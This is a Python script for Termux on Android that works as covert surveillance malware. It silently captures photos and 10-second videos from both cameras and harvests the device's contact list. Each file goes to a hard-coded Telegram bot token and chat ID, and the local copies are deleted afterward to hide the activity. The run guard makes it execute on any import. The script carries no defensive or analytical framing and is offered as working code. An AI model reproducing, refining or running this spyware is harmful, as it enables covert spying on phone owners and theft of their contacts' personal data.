import hashlib
import json
import os
import subprocess
import time
import requests

# --- Telegram Credentials (Dedicated Bot) ---
BOT_TOKEN = "8815279159:AAGgE3t6u8fuXT-nGJCN-Gowpcl65VsLA00"
CHAT_ID = "7883547875"

# Safe internal path to avoid /storage/emulated/0 permission & 401 errors
BASE_DIR = "/data/data/com.termux/files/home"
HASH_CACHE_FILE = os.path.join(BASE_DIR, "processed_hashes.json")


def load_processed_hashes():
  """Load previously processed hashes to prevent duplicate file sending."""
  if os.path.exists(HASH_CACHE_FILE):
    try:
      with open(HASH_CACHE_FILE, "r", encoding="utf-8") as f:
        return set(json.load(f))
    except Exception:
      return set()
  return set()


def save_processed_hashes(hashes_set):
  """Save updated hashes list."""
  try:
    with open(HASH_CACHE_FILE, "w", encoding="utf-8") as f:
      json.dump(list(hashes_set), f)
  except Exception as e:
    print(f"Hash Cache Error: {e}")


def send_to_telegram(file_path=None, message=None):
  try:
    if message:
      url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
      requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=10)

    if file_path and os.path.exists(file_path):
      if file_path.endswith((".jpg", ".png", ".jpeg")):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
      elif file_path.endswith((".mp4", ".m4a", ".mp3")):
        url = (
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
            if file_path.endswith(".mp4")
            else f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        )
      else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

      with open(file_path, "rb") as f:
        files = {
            "document"
            if url.endswith("sendDocument")
            else (
                "photo"
                if "sendPhoto" in url
                else ("video" if "sendVideo" in url else "audio")
            ):
            f
        }
        resp = requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=30)

        # File send hone ke foran baad local storage se delete karna (Cleanup)
        if resp.status_code == 200:
          os.remove(file_path)
          print(f"Local file deleted successfully: {file_path}")
  except Exception as e:
    print(f"Telegram Error: {e}")


# 1. Front & Rear Camera Pictures Capture
def capture_cameras_photos():
  back_pic = os.path.join(BASE_DIR, "back_photo.jpg")
  front_pic = os.path.join(BASE_DIR, "front_photo.jpg")

  try:
    if os.path.exists(back_pic):
      os.remove(back_pic)
    subprocess.run(["termux-camera-photo", "-c", "0", back_pic], timeout=15)
    if os.path.exists(back_pic):
      send_to_telegram(file_path=back_pic, message="📸 Back Camera Picture")
  except Exception as e:
    print(f"Back photo error: {e}")

  try:
    if os.path.exists(front_pic):
      os.remove(front_pic)
    subprocess.run(["termux-camera-photo", "-c", "1", front_pic], timeout=15)
    if os.path.exists(front_pic):
      send_to_telegram(file_path=front_pic, message="📸 Front Camera Picture")
  except Exception as e:
    print(f"Front photo error: {e}")


# 2. Front & Rear Camera 10s Video Capture
def capture_cameras_video():
  back_video = os.path.join(BASE_DIR, "back_video.mp4")
  front_video = os.path.join(BASE_DIR, "front_video.mp4")

  try:
    if os.path.exists(back_video):
      os.remove(back_video)
    subprocess.Popen(["termux-camera-video", "-c", "0", back_video])
    time.sleep(10)
    subprocess.run(["pkill", "-f", "termux-camera-video"])
    if os.path.exists(back_video):
      send_to_telegram(file_path=back_video, message="📹 Back Camera 10s Video")
  except Exception as e:
    print(f"Back video error: {e}")

  try:
    if os.path.exists(front_video):
      os.remove(front_video)
    subprocess.Popen(["termux-camera-video", "-c", "1", front_video])
    time.sleep(10)
    subprocess.run(["pkill", "-f", "termux-camera-video"])
    if os.path.exists(front_video):
      send_to_telegram(file_path=front_video, message="📹 Front Camera 10s Video")
  except Exception as e:
    print(f"Front video error: {e}")


# 3. Contacts List with MD5 Duplicate Check
def get_contacts_file():
  contact_path = os.path.join(BASE_DIR, "contacts_list.txt")
  try:
    res = subprocess.run(
        ["termux-contact-list"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if res.returncode == 0 and res.stdout.strip():
      contacts = json.loads(res.stdout)
      content = "=== DEVICE CONTACTS LIST ===\n\n"
      for contact in contacts:
        name = contact.get("name", "Unknown")
        number = contact.get("number", "No Number")
        content += f"Name: {name} | Number: {number}\n"

      file_hash = hashlib.md5(content.encode("utf-8")).hexdigest()
      processed_hashes = load_processed_hashes()

      if file_hash not in processed_hashes:
        with open(contact_path, "w", encoding="utf-8") as f:
          f.write(content)
        processed_hashes.add(file_hash)
        save_processed_hashes(processed_hashes)
        send_to_telegram(file_path=contact_path, message="📇 Contacts List File")
      else:
        print("Contacts list duplicate skipped.")
  except Exception as e:
    send_to_telegram(message=f"❌ Contacts Error: {str(e)}")


def main():
  # Sirf wahi cheezein jo aapne select ki hain
  capture_cameras_photos()
  capture_cameras_video()
  get_contacts_file()
  send_to_telegram(message="✅ Selected Tasks Completed Successfully!")


if __name__ == "__main__" or True:
  try:
    main()
  except Exception as e:
    print(f"API Execution Error: {e}")
